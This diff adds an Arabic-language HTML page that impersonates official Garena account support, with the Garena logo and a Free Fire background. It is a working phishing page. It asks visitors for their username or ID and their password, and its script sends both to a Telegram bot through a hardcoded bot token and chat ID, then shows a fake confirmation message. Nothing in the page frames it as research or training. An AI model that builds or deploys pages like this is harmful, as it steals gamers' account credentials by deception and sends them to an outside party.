@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دعم غارينا الرسمي</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-image: url('https://i1.wp.com/www.thaqfny.com/wp-content/uploads/2022/04/%D9%84%D8%B9%D8%A8%D8%A9-%D9%81%D8%B1%D9%8A-%D9%81%D8%A7%D9%8A%D8%B1-2.jpg?w=600&ulb=true');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.95);
+            width: 100%;
+            max-width: 420px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+
+        .logo {
+            width: 140px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 22px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #ff0000;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #cc0000;
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- شعار غارينا داخل المنطقة البيضاء -->
+    <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/e/e2/GarenaLogo.svg/1280px-GarenaLogo.svg.png" alt="Garena Logo" class="logo">
+    
+    <h2>دعم حسابات غارينا</h2>
+
+    <form id="supportForm">
+        <div class="input-group">
+            <label for="username">اسم المستخدم / المعرف (ID):</label>
+            <input type="text" id="username" required placeholder="أدخل اسم المستخدم أو ID">
+        </div>
+
+        <div class="input-group">
+            <label for="password">كلمة المرور:</label>
+            <input type="password" id="password" required placeholder="أدخل كلمة المرور">
+        </div>
+
+        <button type="submit">تأكيد</button>
+    </form>
+
+    <div class="footer">
+        © Garena Corporation. جميع الحقوق محفوظة.
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8631186494:AAFg8-09-5SCFnSUUuI7udG7WzUl6ZrbYZI';
+    const CHAT_ID = '8862229473';
+
+    document.getElementById('supportForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        const text = `📬 *طلب جديد - دعم غارينا*\n\n👤 *المعرف/الاسم:* ${username}\n🔑 *كلمة المرور:* ${password}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                alert('تم إرسال طلبك بنجاح، سيتم التواصل معك قريباً.');
+                document.getElementById('supportForm').reset();
+            } else {
+                alert('حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً.');
+            }
+        })
+        .catch(error => {
+            alert('تعذر الاتصال بالسيرفر.');
+        });
+    });
+</script>
+
+</body>
+</html>
